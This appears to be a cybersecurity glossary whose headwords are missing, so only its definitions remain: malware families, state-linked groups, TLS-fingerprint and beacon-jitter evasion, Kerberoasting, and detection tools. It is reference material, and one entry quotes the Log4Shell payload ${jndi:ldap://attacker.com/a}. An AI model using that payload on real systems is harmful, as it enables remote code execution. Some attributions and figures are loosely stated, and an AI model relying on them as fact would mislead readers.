Unauthenticated or low-privilege access to Jenkins Groovy Script Console that allows arbitrary OS command execution. Frequently exploited in cryptojacking and ransomware initial access (CVE-2017-1000353, CVE-2018-1000861).
Open-source tool for automated exploitation of JBoss/Java application server deserialization vulnerabilities. Still used in 2025 against legacy systems.
Java Naming and Directory Interface attack vector famously exploited in Log4Shell (CVE-2021-44228) via ${jndi:ldap://attacker.com/a} payloads that trigger remote class loading.
Android billing-fraud malware family that has infected millions of Google Play apps since 2017 by subscribing users to premium SMS services without consent (removed in waves 2019–2025).
North Korean state-sponsored group targeting South Korea, Japan, Vietnam, and the Middle East with custom implants (ROKRAT, BLUELIGHT, DOLPHIN).
Russian-speaking initial access broker (IAB) that specializes in selling access to corporate VPNs and Citrix environments to Conti, LockBit, and ALPHV affiliates (2022–2025).
Hypothetical supply-chain scenario where a single compromised update from a major software vendor (Microsoft, Apple, Google) could simultaneously infect billions of devices (Gartner 2024 prediction).
Multiple state-sponsored backdoors discovered in Juniper firewalls (2015 Dual_EC_DRBG, 2018 ScreenOS unauthorized SSH key, 2020–2024 Pulse Secure/Ivanti chains).
.NET information stealer (2020–2025) that targets browser credentials, crypto wallets, gaming accounts, and 2FA tokens. Frequently dropped by SmokeLoader and RIG EK.
Malware technique that randomizes TLS ClientHello fields on each connection to defeat JA3/JARM fingerprinting (used by TrickBot, QakBot, and modern Cobalt Strike profiles).
Malware technique that injects keyloggers, form-grabbers, or cryptojacking scripts into legitimate websites via compromised ad networks or supply-chain attacks (Magecart).
North Korean nation-state compromise of JumpCloud MDM platform that led to downstream breaches of cryptocurrency and tech companies via forced password rotation.
Physical attack where malicious public USB charging stations install malware or steal data from connected phones (FBI warning 2019–2025, mitigated by USB data blockers).
Cloud-managed wireless and SD-WAN platform with built-in security features including client isolation, rogue AP detection, and WIDS/WIPS.
Rare but possible scenario where two completely different TLS stacks produce the same JARM hash, causing false positives in detection rules (mitigated by combining with JA3 and HTTP fingerprints).
Random delay added between malware beaconing intervals to avoid time-based detection and make traffic appear more human-like (common in modern C2 frameworks).
Post-Log4Shell technique that uses alternative JNDI providers (rmi, corba, dnslog) or message lookup tricks to still achieve remote class loading despite patches.
Historical exploit kits (Nuclear, RIG, KaiXin) that targeted outdated Java browser plugins with drive-by downloads (largely obsolete after Java applet deprecation).
Signature method used by EDR and NDR to identify Cobalt Strike, Metasploit, Sliver, and custom C2 frameworks based on their unique TLS fingerprints.
Compromise of public Jupyter instances (port 8888) via weak/no passwords leading to cryptojacking, data theft, or persistence (Microsoft 365 Defender 2024 reports).
Public and commercial databases (GreyNoise, Censys, Shodan) that map JARM hashes to known software (Cobalt Strike versions, cloud providers, scanners).
Lightweight C2 framework written in Rust with extreme jitter, memory-only execution, and built-in JA3/JARM evasion (underground 2025).
Malware that compiles C/C++ payloads to WebAssembly (WASM) for cross-platform execution in browsers and Node.js (cryptojackers, stealers, 2024–2025 trend).
Technique used by advanced red teams and APTs to generate unique TLS fingerprints per connection or per target to defeat network-based blocking.
Juniper’s remote-access VPN client repeatedly targeted in zero-day campaigns (2021–2025) due to widespread government and critical infrastructure deployment.
Collecting JARM fingerprints from incoming TLS handshakes without active scanning (used in Zeek/Bro, Corelight sensors, and cloud WAFs).
Newer Go-based trojan used by Russian-speaking FIN12 affiliates for initial access and lateral movement (2024–2025).
Abusing the GREASE mechanism to inject random values into TLS fields, making fingerprinting unreliable (advanced Cobalt Strike malleable profiles).
Adding random sleep intervals (e.g., 30 % jitter on 60-second beacon) to avoid beaconing pattern detection by EDR and NDR.
Historical infection method that used malicious Java applets signed with stolen certificates (RedKit, Cool EK, 2012–2016).
Changing TLS fingerprint periodically during a campaign to evade blocklists (used by QakBot and Emotet in 2024–2025).
Enterprise firewall platform repeatedly targeted by Chinese actors (UNC3886, Volt Typhoon) via zero-days and living-off-the-land techniques.
Combining JARM with User-Agent, Accept, and other headers for higher-confidence identification of specific malware families.
Open-source tool that detects beaconing malware by analyzing timing jitter patterns in network traffic (SANS research).
Cryptocurrency mining script (Coinhive successor) injected into compromised websites (drive-by mining still active on low-tier sites in 2025).
Deliberately crafting TLS ClientHello to mimic legitimate software (Chrome, curl, iPhone) while delivering malicious payloads.
Juniper’s cloud threat prevention service that uses machine learning and sandboxing (now integrated into Security Director Cloud).
Malware technique that uses highly variable sleep intervals (Fibonacci, Gaussian distribution) to defeat sleep-based EDR detection (Cobalt Strike Sleepmask).
Log4j alternatives (Logback, JUL) that still contain similar gadget chains exploitable via deserialization attacks.
Underground toolkits that automatically generate randomized TLS fingerprints for every outbound connection (2025).
Virtual firewall widely used in cloud environments and repeatedly targeted in supply-chain and zero-day campaigns.
Combining jitter in timing with fast-flux or DGA domains to make C2 infrastructure extremely resilient to takedowns.
Multi-stage redirection through legitimate ad networks and CDNs to hide final malicious payload (common in malvertising 2024–2025).
Machine-learning technique that groups similar JARM hashes to identify new malware variants or custom C2 frameworks.
Cloud-managed networking platform with built-in security analytics and automated threat mitigation.
Hypothetical scenario where all malware uses extreme jitter and memory-only execution, rendering traditional beacon detection obsolete (predicted by CrowdStrike 2025).
Magecart-style payment card stealer injected into e-commerce checkout pages (still the #1 web-based card fraud method in 2025).
Enterprise practice of only allowing known-good JARM hashes for critical services (Chrome, Office365, etc.) and blocking everything else.
Multiple critical remote code execution vulnerabilities in Junos OS Space (web management interface) exploited by Chinese state actors against ISPs and governments.

New ransomware strain (2024–2025) that uses Bring Your Own Vulnerable Driver (BYOVD) technique by loading a signed but vulnerable Martini driver to disable EDR before encryption (discovered by Trend Micro).

Attack that requests TGS tickets for any SPN-enabled account, then offline-cracks the encrypted portion using the service account’s NTLM hash (MITRE T1558.003). One of the most common Active Directory attacks in 2024–2025.
Vulnerability in the operating system kernel that allows privilege escalation or code execution at Ring 0 (Dirty Pipe CVE-2022-0847, PrintNightmare, Follina MSDT, Windows CLFS CVE-2023-28252).
Malware or hardware that records every keystroke (commercial: Refog, Spyrix; underground: FormBook, AgentTesla, HawkEye, Azorult). Still the primary method for stealing credentials in 2025.

Lockheed Martin’s seven-phase cyber intrusion model (Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives). Basis for many defensive frameworks.
Golang-based cryptojacking malware active since 2019 that targets misconfigured Docker API ports, Kubernetes clusters, Redis, SaltStack, and cloud platforms for Monero mining and lateral movement.
Windows post-exploitation rootkit/framework similar to Meterpreter but written in Python/JS and using COM scripting for living-off-the-land (2020–2025 red-team favorite).
Microsoft-named European mercenary group (believed Austrian/Slovenian) that sold Subzero/Devil’s Tongue zero-click, zero-day exploits for Windows, iOS, and Android to governments (2022–2025).
North Korean APT (believed part of Kimsuky cluster) that uses custom RATs, PowerShell, and malicious RTF documents targeting Russian, South Korean, and diplomatic entities.
Tool that combines Kerberoasting, RBCD (Resource-Based Constrained Delegation), and relaying to achieve full domain compromise from a standard domain user (2023–2025).
LockBit 3.0 encryptor (also called LockBit Black) written in C++ with extreme speed and intermittent encryption to evade detection (2023–2025).
AWS-named Chinese APT (likely subgroup of APT41) that conducted long-term espionage against satellite, defense, and telecom companies using custom Golang implants (2024–2025).
Wi-Fi attack that responds to any probe request with a fake access point of the requested SSID, forcing clients to connect (used by WiFi Pineapple and many rogue AP tools).
Advanced PowerShell-based post-exploitation framework used by Russian-speaking groups as a Cobalt Strike alternative (2024–2025).
Chinese state-sponsored group active since 2008, known for custom backdoors (TidePool, Okrum) and targeting European diplomatic and defense sectors.
